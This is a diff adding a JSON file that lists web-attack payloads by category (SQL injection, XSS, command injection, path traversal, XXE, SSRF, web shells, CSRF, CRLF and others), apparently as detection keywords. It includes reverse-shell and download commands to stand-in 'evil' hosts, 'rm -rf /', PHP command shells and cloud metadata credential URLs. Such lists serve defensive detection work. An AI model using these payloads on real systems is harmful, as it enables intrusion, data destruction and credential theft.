@@ -1,0 +1,186 @@
+{
+  "SQL Injection": {
+    "keywords": [
+      "' OR '1'='1",
+      "' OR 1=1 --",
+      "\" OR 1=1 --",
+      "' OR 'a'='a",
+      "'; DROP",
+      "'; DROP TABLE",
+      "'; EXEC",
+      "' UNION SELECT",
+      "\" UNION SELECT",
+      "UNION SELECT NULL",
+      "OR 1=1#",
+      "OR 1=1--",
+      "' OR '1'='1' --",
+      "\" OR \"\"=\"",
+      "admin'--",
+      "' AND 1=1",
+      "0x414243' OR 1=1 --",
+      "'; WAITFOR DELAY '0:0:10'--",
+      "' OR SLEEP(10)--",
+      "' OR BENCHMARK(1000000,MD5(1))--"
+    ]
+  },
+  "Cross-Site Scripting (XSS)": {
+    "keywords": [
+      "<script>alert(1)</script>",
+      "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "<img src=x onerror=alert(1)>",
+      "\"><svg/onload=alert(1)>",
+      "<svg><script>alert(1)</script></svg>",
+      "<body onload=alert(1)>",
+      "javascript:alert(1)",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "<iframe src=\"javascript:alert(1)\"></iframe>",
+      "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+      "ｓｃｒｉｐｔ>alert(1)</ｓｃｒｉｐｔ>",
+      "<details open ontoggle=alert(1)>",
+      "<input autofocus onfocus=alert(1)>"
+    ]
+  },
+  "Command Injection / RCE": {
+    "keywords": [
+      "; ls -la",
+      "| cat /etc/passwd",
+      "whoami",
+      "$(whoami)",
+      "&& wget http://evil/shell -O /tmp/s",
+      "& curl http://evil.example/s -o /tmp/s",
+      "; rm -rf /",
+      "; nc -e /bin/sh evil 4444",
+      "| nc evil 4444 -e /bin/sh",
+      "; shutdown -h now",
+      "| bash -i >& /dev/tcp/evil/4444 0>&1"
+    ]
+  },
+  "Local File Inclusion / Path Traversal (LFI)": {
+    "keywords": [
+      "../../../../etc/passwd",
+      "../../../../../etc/passwd",
+      "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "../..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "/etc/passwd",
+      "C:\\windows\\system32\\drivers\\etc\\hosts",
+      "../../../var/www/html/config.php",
+      "..\\..\\..\\..\\windows\\win.ini"
+    ]
+  },
+  "Remote File Inclusion (RFI)": {
+    "keywords": [
+      "http://evil.example.com/shell.txt",
+      "https://evil.com/shell.php",
+      "ftp://evil.com/shell",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://evil.com/malicious",
+      "http://127.0.0.1:8080/shell"
+    ]
+  },
+  "XML External Entity (XXE)": {
+    "keywords": [
+      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+      "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> ]>",
+      "<!ENTITY % remote SYSTEM \"http://evil/payload\">%remote;",
+      "<!ENTITY % file SYSTEM \"file:///etc/passwd\">%file;",
+      "<!ENTITY % dtd SYSTEM \"http://evil/exploit.dtd\"> %dtd;"
+    ]
+  },
+  "Server-Side Request Forgery (SSRF)": {
+    "keywords": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://127.0.0.1:80/admin",
+      "http://localhost:5984/_utils/",
+      "file:///etc/hosts",
+      "gopher://127.0.0.1:11211/_stats",
+      "http://[::1]:80/",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    ]
+  },
+  "File Upload / Malicious File": {
+    "keywords": [
+      "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>",
+      "<?php system($_GET['cmd']);?>",
+      "<svg><script>alert(1)</script></svg>",
+      "image.jpg.php",
+      "shell.php",
+      "<?=$_GET['cmd']?>",
+      "MZ" 
+    ]
+  },
+  "Broken Access Control / IDOR": {
+    "keywords": [
+      "{\"userId\": 1002}",
+      "/api/invoices/8675309",
+      "/users/1000/profile",
+      "?id=1001",
+      "id=../../other_user",
+      "user_id=9999",
+      "account=9999"
+    ]
+  },
+  "Authentication / Session": {
+    "keywords": [
+      "password,123456,admin,admin123,qwerty",
+      "PHPSESSID=malicioussid",
+      "sessionid=123456",
+      "Authorization: Bearer ",
+      "Basic YWRtaW46YWRtaW4=",
+      "username=admin'--",
+      "login=admin' or '1'='1"
+    ]
+  },
+  "Cross-Site Request Forgery (CSRF)": {
+    "keywords": [
+      "<form action=\"/transfer\" method=\"POST\"><input name=\"amount\" value=\"1000\"></form><script>document.forms[0].submit()</script>",
+      "<img src=\"http://evil/transfer?amount=1000\"/>",
+      "<body onload=document.forms[0].submit()>"
+    ]
+  },
+  "NoSQL / LDAP Injection": {
+    "keywords": [
+      "{\"$ne\": null}",
+      "{\"$gt\": \"\"}",
+      ") (|(uid=))",
+      "admin')(|(uid=*",
+      "{\"username\":{\"$ne\":null}}",
+      "$where: function() { return this.password == 'x' }"
+    ]
+  },
+  "Open Redirect": {
+    "keywords": [
+      "https://evil.com",
+      "http://evil.com/?q=",
+      "//evil.com",
+      "/redirect?url=https://evil.com"
+    ]
+  },
+  "HTTP Header / Host / CRLF Injection": {
+    "keywords": [
+      "Host: evil.com",
+      "%0d%0aBCC: attacker@evil.com",
+      "%0aSet-Cookie: session=evil",
+      "Referer: http://evil.com",
+      "X-Forwarded-Host: evil.com"
+    ]
+  },
+  "Unsafe Deserialization / Object Injection": {
+    "keywords": [
+      "O:8:\"Exploit\":0:{}",
+      "rO0AB",
+      "!!python/object:",
+      "php_object_encode",
+      "c:16:\"__construct\""
+    ]
+  },
+  "Denial of Service / Resource Exhaustion": {
+    "keywords": [
+      "POST /search HTTP/1.1\\r\\nContent-Length: 1000000000\\r\\n\\r\\n",
+      "Slowloris",
+      "huge_file_upload",
+      "AAAA... (very long string)",
+      "%00%00%00%00%00%00" 
+    ]
+  }
+}
